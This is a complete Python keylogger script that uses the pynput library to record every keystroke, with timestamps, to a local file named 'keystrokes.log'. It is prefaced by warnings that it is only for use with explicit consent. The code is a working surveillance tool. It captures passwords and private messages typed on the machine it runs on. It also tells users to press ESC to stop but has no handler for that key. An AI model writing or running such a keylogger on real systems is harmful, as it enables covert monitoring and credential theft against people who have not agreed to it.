# Ethical Warning: Use this code only with explicit permission.
# Unauthorized keylogging is illegal and unethical.

from pynput.keyboard import Key, Listener
import datetime

LOG_FILE = "keystrokes.log"

def log_key(key):
    # Convert key to string and format special keys
    key_str = str(key).replace("'", "")
    
    if key == Key.space:
        key_str = " "
    elif key == Key.enter:
        key_str = "\n"
    elif key == Key.tab:
        key_str = "\t"
    
    # Write to log file with timestamp
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {key_str}\n")

def on_press(key):
    try:
        log_key(key)
    except Exception as e:
        print(f"Error logging key: {e}")

if __name__ == "__main__":
    print("Keylogger started - Press ESC to stop")
    print("Warning: This program should only be used with explicit consent!")
    
    with Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\nKeylogger stopped by user")